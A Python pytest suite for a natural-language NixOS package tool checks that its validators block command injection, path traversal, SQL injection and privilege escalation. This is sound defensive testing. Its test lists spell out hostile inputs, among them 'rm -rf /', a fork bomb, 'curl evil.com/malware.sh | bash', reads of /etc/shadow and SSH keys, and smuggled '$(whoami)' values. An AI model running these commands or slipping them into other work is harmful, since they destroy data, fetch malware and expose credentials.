#!/usr/bin/env python3
"""
Comprehensive Security Test Suite for Nix for Humanity
Tests all security validations to ensure protection against command injection
"""

import sys
from pathlib import Path

import pytest

# Add backend to path
backend_path = Path(__file__).parent.parent
sys.path.insert(0, str(backend_path))

from api.schema import Request
from core.executor import SafeExecutor
from core.intent import Intent, IntentType
from security.input_validator import InputValidator, SecurityContext
from security.permission_checker import PermissionChecker


class TestInputValidator:
    """Test the input validation security layer"""

    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked"""
        dangerous_inputs = [
            "install firefox; rm -rf /",
            "install firefox && wget evil.com/malware",
            "install firefox | cat /etc/passwd",
            "install firefox`cat /etc/shadow`",
            "install firefox$(whoami)",
            "install firefox${PATH}",
            "install firefox; :(){ :|:& };:",  # Fork bomb
        ]

        for dangerous_input in dangerous_inputs:
            result = InputValidator.validate_input(dangerous_input, "nlp")
            assert not result["valid"], f"Failed to block: {dangerous_input}"
            assert "dangerous" in result["reason"].lower()

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked"""
        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "/etc/../etc/shadow",
            "~/../../../etc/passwd",
            "/home/user/../../etc/passwd",
        ]

        for dangerous_path in dangerous_paths:
            result = InputValidator.validate_input(dangerous_path, "path")
            assert not result["valid"], f"Failed to block path: {dangerous_path}"
            assert (
                "traversal" in result["reason"].lower()
                or "outside" in result["reason"].lower()
            )

    def test_package_name_validation(self):
        """Test package name validation"""
        # Valid package names
        valid_packages = [
            "firefox",
            "python3",
            "git-lfs",
            "nodejs-16_x",
            "python3.11-numpy",
        ]

        for package in valid_packages:
            result = InputValidator.validate_input(package, "package")
            assert result["valid"], f"Failed to allow valid package: {package}"

        # Invalid package names
        invalid_packages = [
            "firefox; rm -rf /",
            "firefox`whoami`",
            "firefox$(cat /etc/passwd)",
            "firefox|grep",
            "firefox&&evil",
            "../../../bin/bash",
            "rm",  # Suspicious package
        ]

        for package in invalid_packages:
            result = InputValidator.validate_input(package, "package")
            assert not result["valid"], f"Failed to block invalid package: {package}"

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention (for future database features)"""
        sql_attempts = [
            "search firefox'; DROP TABLE packages; --",
            "search firefox' OR 1=1 --",
            "search firefox' UNION SELECT * FROM users --",
        ]

        for sql_attempt in sql_attempts:
            result = InputValidator.validate_input(sql_attempt, "nlp")
            assert not result["valid"], f"Failed to block SQL injection: {sql_attempt}"

    def test_command_validation(self):
        """Test command validation for execution"""
        # Valid commands
        valid_commands = [
            ["nix-env", "-iA", "nixpkgs.firefox"],
            ["nixos-rebuild", "switch"],
            ["nix-channel", "--update"],
            ["nix-collect-garbage", "-d"],
        ]

        for command in valid_commands:
            valid, error = InputValidator.validate_command(command)
            assert valid, f"Failed to allow valid command: {command}, error: {error}"

        # Invalid commands
        invalid_commands = [
            ["rm", "-rf", "/"],
            ["curl", "evil.com/malware.sh", "|", "bash"],
            ["nix-shell", "--run", "rm -rf /"],
            ["eval", "malicious code"],
            ["sh", "-c", "fork bomb"],
            ["../../bin/bash"],
        ]

        for command in invalid_commands:
            valid, error = InputValidator.validate_command(command)
            assert not valid, f"Failed to block dangerous command: {command}"

    def test_nix_expression_validation(self):
        """Test Nix expression validation"""
        # Valid expressions
        valid_exprs = [
            "{ pkgs }: pkgs.firefox",
            "pkgs.python3.withPackages (ps: with ps; [ numpy ])",
        ]

        for expr in valid_exprs:
            valid, error = InputValidator.validate_nix_expression(expr)
            assert valid, f"Failed to allow valid expression: {expr}, error: {error}"

        # Invalid expressions
        invalid_exprs = [
            "import /etc/passwd",
            "builtins.readFile /etc/shadow",
            "builtins.exec 'rm -rf /'",
            "fetchurl http://evil.com/malware",
        ]

        for expr in invalid_exprs:
            valid, error = InputValidator.validate_nix_expression(expr)
            assert not valid, f"Failed to block dangerous expression: {expr}"

    def test_input_length_limits(self):
        """Test that input length limits are enforced"""
        # Test overly long input
        long_input = "a" * 10000
        result = InputValidator.validate_input(long_input, "nlp")
        assert not result["valid"]
        assert "too long" in result["reason"].lower()

        # Test long package name
        long_package = "firefox" + "a" * 200
        result = InputValidator.validate_input(long_package, "package")
        assert not result["valid"]
        assert "too long" in result["reason"].lower()

    def test_sanitization(self):
        """Test input sanitization"""
        # Test NLP sanitization
        dirty_input = "install   firefox\n\n\t  please"
        result = InputValidator.validate_input(dirty_input, "nlp")
        assert result["valid"]
        assert result["sanitized_input"] == "install firefox please"

        # Test display sanitization
        ansi_text = "\x1b[31mRed text\x1b[0m with \x00 null"
        sanitized = InputValidator.sanitize_for_display(ansi_text)
        assert "\x1b" not in sanitized
        assert "\x00" not in sanitized


class TestCommandValidator:
    """Test the command validation layer"""

    @pytest.mark.asyncio
    async def test_command_validator_integration(self):
        """Test CommandValidator integration with executor"""
        # This would require mocking CommandValidator
        # For now, we'll create a basic test structure
        pass


class TestPermissionChecker:
    """Test permission checking"""

    def test_operation_permissions(self):
        """Test that operations require appropriate permissions"""
        # Test read operations don't require elevation
        result = PermissionChecker.check_operation_permission(
            "read-file", {"path": "/etc/nixos/configuration.nix"}
        )
        assert result["allowed"]
        assert not result.get("requires_elevation")

        # Test write operations require elevation
        result = PermissionChecker.check_operation_permission(
            "modify-configuration", {"path": "/etc/nixos/configuration.nix"}
        )
        # Should either be allowed with elevation or denied without
        if result["allowed"]:
            assert result.get("requires_elevation")


class TestSafeExecutor:
    """Test the safe executor"""

    @pytest.fixture
    def executor(self):
        return SafeExecutor()

    @pytest.mark.asyncio
    async def test_executor_validation(self, executor):
        """Test that executor validates before execution"""
        # Create a malicious intent
        intent = Intent(
            type=IntentType.INSTALL_PACKAGE,
            entities={"package": "firefox; rm -rf /"},
            confidence=1.0,
            raw_text="install firefox; rm -rf /",
        )

        plan = ["install firefox; rm -rf /"]

        result = await executor.execute(plan, intent)
        assert not result.success
        assert (
            "validation failed" in result.error.lower()
            or "invalid" in result.error.lower()
        )

    def test_validate_execution_request(self, executor):
        """Test execution request validation"""
        intent = Intent(
            type=IntentType.INSTALL_PACKAGE,
            entities={"package": "firefox"},
            confidence=1.0,
            raw_text="install firefox",
        )

        # Test valid plan
        valid_plan = ["install firefox"]
        result = executor._validate_execution_request(valid_plan, intent)
        assert result.valid

        # Test dangerous plan
        dangerous_plan = ["install firefox; rm -rf /"]
        result = executor._validate_execution_request(dangerous_plan, intent)
        assert not result.valid
        assert "unsafe pattern" in result.reason.lower()

        # Test overly complex plan
        complex_plan = [f"action_{i}" for i in range(25)]
        result = executor._validate_execution_request(complex_plan, intent)
        assert not result.valid
        assert "too complex" in result.reason.lower()


class TestEndToEndSecurity:
    """End-to-end security tests"""

    @pytest.mark.asyncio
    async def test_malicious_request_flow(self):
        """Test that malicious requests are blocked at multiple layers"""
        from nix_humanity.core.engine import NixForHumanityBackend

        backend = NixForHumanityBackend()

        # Test various attack vectors
        attack_vectors = [
            "install firefox; rm -rf /",
            "update system && curl evil.com/malware | sh",
            "search packages`cat /etc/passwd`",
            "rollback system; :(){ :|:& };:",
            "install ../../bin/bash",
        ]

        for attack in attack_vectors:
            request = Request(query=attack, context={"execute": True})

            response = backend.process(request)
            assert not response.success, f"Failed to block attack: {attack}"
            # Should be blocked by validation, not reach execution
            assert (
                "validation" in response.text.lower()
                or "invalid" in response.text.lower()
            )

    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self):
        """Test that privilege escalation is prevented"""
        from nix_humanity.core.engine import NixForHumanityBackend

        backend = NixForHumanityBackend()

        # Test commands that try to escalate privileges
        escalation_attempts = [
            "install sudo",
            "run sudo rm -rf /",
            "execute chmod 777 /etc/passwd",
            "update system with sudo -i",
        ]

        for attempt in escalation_attempts:
            request = Request(query=attempt, context={"execute": True})

            response = backend.process(request)
            # Should either fail validation or require proper elevation
            if response.success:
                # If it succeeds, it should be a safe interpretation
                assert (
                    "sudo" not in response.text.lower()
                    or "elevation required" in response.text.lower()
                )


class TestSecurityContext:
    """Test security context manager"""

    def test_security_context_logging(self):
        """Test that security context logs operations"""
        with SecurityContext("test_operation", "test_user") as ctx:
            # Perform some operation
            pass

        # Context should log start and end
        assert ctx.user == "test_user"
        assert ctx.operation_type == "test_operation"


# Performance tests for security validation
class TestSecurityPerformance:
    """Test that security doesn't significantly impact performance"""

    def test_validation_performance(self):
        """Test that validation is fast"""
        import time

        # Test input validation performance
        inputs = ["install firefox"] * 1000

        start = time.time()
        for inp in inputs:
            InputValidator.validate_input(inp, "nlp")
        duration = time.time() - start

        # Should validate 1000 inputs in under 1 second
        assert duration < 1.0, f"Validation too slow: {duration}s for 1000 inputs"


if __name__ == "__main__":
    # Run all tests
    pytest.main([__file__, "-v", "--tb=short"])
